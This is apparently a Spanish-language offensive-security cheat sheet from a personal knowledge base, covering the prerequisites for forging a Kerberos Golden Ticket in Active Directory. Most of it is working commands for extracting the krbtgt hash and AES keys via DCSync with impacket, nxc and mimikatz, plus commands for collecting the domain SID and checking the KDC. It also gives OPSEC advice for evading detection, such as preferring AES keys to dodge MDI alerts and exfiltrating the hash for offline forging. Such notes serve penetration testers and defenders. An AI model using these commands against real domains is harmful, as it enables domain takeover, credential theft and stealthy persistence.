---
aliases:
  - Golden Ticket prereqs
  - krbtgt hash extraction
tags:
  - type/technique
  - technique/credential-access
  - technique/kerberos
  - env/windows
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[Golden Ticket]]'
---

# Golden Ticket - Prereqs y Recolección

***

## krbtgt NT hash (via DCSync)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-secretsdump corp/admin:pass@DC -just-dc-user krbtgt` | krbtgt NT hash + AES keys | Standard post-DA. |
| `impacket-secretsdump -hashes :NTHASH corp/admin@DC -just-dc-user krbtgt` | Idem via PtH | Sin password. |
| `nxc smb DC -u admin -p pass --ntds --users \| grep krbtgt` | krbtgt hash de nxc output | Post `--ntds`. |
| `mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt` | krbtgt hash desde Windows | On-host mimikatz. |
^gt-pre-krbtgt

```bash
# DCSync targeted — solo krbtgt
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt

# Output clave:
# corp.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<NTHASH>:::
# krbtgt:aes256-cts-hmac-sha1-96:<AES256HASH>
# krbtgt:aes128-cts-hmac-sha1-96:<AES128HASH>
```

___

## krbtgt AES keys (preferred)

| **Clave** | **Tipo** | **Por qué preferir** |
|:---:|:---:|:---:|
| `aes256-cts-hmac-sha1-96` | AES256 | Evita downgrade RC4 detection — stealth. |
| `aes128-cts-hmac-sha1-96` | AES128 | Alternativa. |
| NT hash (RC4) | RC4 | Más ruidoso — MDI detecta downgrade en dominio AES-only. |
^gt-pre-aes

```bash
# Output de secretsdump con -just-dc (no -just-dc-ntlm)
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt

# Guardar AES256 key para forge stealth:
# krbtgt:aes256-cts-hmac-sha1-96:AAAAABBBBBCCCCC...
```

___

## Domain SID

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-lookupsid corp.local/user:pass@DC 0` | Domain SID (RID 0) | Linux — pre-forge. |
| `impacket-lookupsid corp.local/user:pass@DC 0 \| grep -i "domain sid"` | Solo SID | Clean output. |
| `Get-DomainSID` (PowerView) | Domain SID | Windows. |
| `whoami /user` | User SID → quitar RID final | Windows — manual. |
| `Get-ADDomain \| Select-Object DomainSID` | Domain SID (PowerShell AD) | Windows. |
^gt-pre-sid

```bash
# Linux — impacket lookupsid
impacket-lookupsid corp.local/administrator:'P@ssw0rd'@dc01.corp.local 0
# Output: [*] Domain SID is: S-1-5-21-1234567890-987654321-111222333

# Alternativa — extraer del output de secretsdump
# corp.local\krbtgt:502:... → SID del dominio está en el contexto del DC
```

```powershell
# Windows
(Get-ADDomain).DomainSID.Value
# S-1-5-21-1234567890-987654321-111222333
```

___

## FQDN y otros datos

| **Dato** | **Comando** | **Cuándo** |
|:---:|:---:|:---:|
| Domain FQDN | `nslookup -type=SOA corp.local` o `realm list` | Pre-forge. |
| DC FQDN | `nslookup -type=SRV _kerberos._tcp.corp.local` | Para acceso post-forge. |
| Forest root domain | `impacket-lookupsid ... \| grep -i root` | Cross-forest scope. |
| krbtgt RID | `502` (siempre fixed) | Para verificar hash correcto. |
^gt-pre-fqdn

___

## Verificación pre-forge

| **Check** | **Comando** | **Esperado** |
|:---:|:---:|:---:|
| krbtgt hash correcto | `impacket-secretsdump ... -just-dc-user krbtgt` | Hash no vacío, RID 502 |
| Domain SID correcto | `impacket-lookupsid ... 0` | S-1-5-21-X-Y-Z |
| Conectividad KDC | `nc -zv dc01.corp.local 88` | Conexión exitosa |
| DNS resolución | `nslookup dc01.corp.local` | IP del DC |
^gt-pre-verify

```bash
# Verificar todo pre-forge
echo "=== krbtgt hash ==="
impacket-secretsdump corp.local/administrator:'P@ssw0rd'@dc01.corp.local -just-dc-user krbtgt 2>/dev/null | grep "krbtgt"

echo "=== Domain SID ==="
impacket-lookupsid corp.local/administrator:'P@ssw0rd'@dc01.corp.local 0 2>/dev/null | grep -i "domain sid"

echo "=== KDC port ==="
nc -zv dc01.corp.local 88 2>&1
```

___

## OPSEC pre-forge

| **Consideración** | **Detalle** | **Acción** |
|:---:|:---:|:---:|
| DCSync para krbtgt genera 4662 | Inevitable con DRSUAPI | Aceptar o usar ntdsutil/VSS |
| Guardar krbtgt hash offline | No repetir DCSync desde el mismo host | Exfiltrar hash, forjar offline |
| AES > RC4 para el ticket | RC4 forge detectable en AES-only domains | Usar `-aesKey` no `-nthash` |
| User real existente | "fakeadmin" no existe → 4624 anomaly | Usar "administrator" o user real |
^gt-pre-opsec

***
